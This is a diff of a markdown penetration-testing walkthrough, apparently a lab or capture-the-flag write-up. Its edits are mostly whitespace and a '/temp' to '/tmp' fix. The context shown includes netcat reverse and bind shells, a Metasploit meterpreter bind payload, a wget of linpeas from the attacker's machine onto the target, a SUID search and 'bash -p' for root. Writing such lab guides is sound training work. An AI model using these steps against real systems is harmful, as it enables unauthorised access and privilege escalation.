@@ -249,6 +249,7 @@ OR
 ```bash
 smbmap -H <IP> -p 445 -r Temp
 ```
+
 Once we connect to the `Temp` share, and use `dir` or `ls` we can see the
 following files:
 
@@ -499,13 +500,10 @@ nc -lnvp <PORT>
 
 - `-l`: This switch tells nc to operate in listening mode, which means it will
   listen for incoming connections rather than initiating connections.
-
 - `-n`: This switch tells nc not to perform DNS resolution on any incoming
   addresses. This can speed up the operation, especially when dealing with IP addresses instead of domain names.
-
 - `-v`: This switch enables verbose mode, which provides more detailed output,
   including information about incoming connections and data transfer.
-
 - `-p` port: This switch specifies the port number on which nc should listen
   for incoming connections.
 
@@ -518,11 +516,11 @@ This is the shell that we will be using.
 If we did everything right we should have a shell on the computer and we can
 move to the [Privilege Escalation phase](#privilege-escalation)
 
-
 **Bind Shell**: Communication initiated by the attacker's system to the
 compromised system.
 
 This is the shell that we will be using 
+
 > Note: Unlike the reverse shell we don't need to open a listeners first
  
 ```bash
@@ -535,6 +533,7 @@ Don't forget that we need to make the connection, we can do that with the
 ```bash
 nc <IP> <PORT>
 ```
+
 If we did everything right we should have a shell on the computer and we can
 move to the [Privilege Escalation phase](#privilege-escalation)
 
@@ -655,7 +654,6 @@ set payload payload/cmd/unix/python/meterpreter/bind_tcp
 
 Now that we have our payload we need to configure the settings.
 
-
 Now we can move on the [Privilege Escalation phase](#privilege-escalation)
 
 ## Privilege Escalation
@@ -702,9 +700,10 @@ wget https://github.com/carlospolop/PEASS-ng/releases/download/20240223-ab2bb023
 
 New problem, It seems that we can't write to most directory.
 
-But we can write to the `/temp` directory. Now we can download the linpeas.
+But we can write to the `/tmp` directory. Now we can download the linpeas.
 
 To run Linpeas you can just do the following:
+
 ```bash
 ./linpeas.sh
 ```
@@ -718,6 +717,7 @@ file over.
 ```bash
 python3 -m http.server
 ```
+
 > Note: You have to be in the current directory of Linpeas to see the file.
 
 Now on the machine that you want to use Linpeas, You have to now download the
@@ -729,14 +729,13 @@ wget <OUR Attacker machine IP>/linpeas.sh
 
 New problem, It seems that we can't write to most directory.
 
-But we can write to the `/temp` directory. Now we can download the linpeas.
+But we can write to the `/tmp` directory. Now we can download the linpeas.
 
 Now you can run linpeas with the following:
 
 ```bash
 ./linpeas.sh
 ```
-
 
 ### Manual Way
 
@@ -746,6 +745,7 @@ We can use the following command to check if there is SUID set on a program.
 ```bash
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 ```
+
 This uses the find command to look for any program that have permission 4000
 which is `-rwsr-xr-x`.
 
@@ -760,6 +760,7 @@ give you a privilege escalation method.
 ```bash
 bash -p
 ```
+
 Now we should have root and we can this by using the `whoami` command.
 
 ![Whoami command](../../Assets/PwnToOwn/root.png)
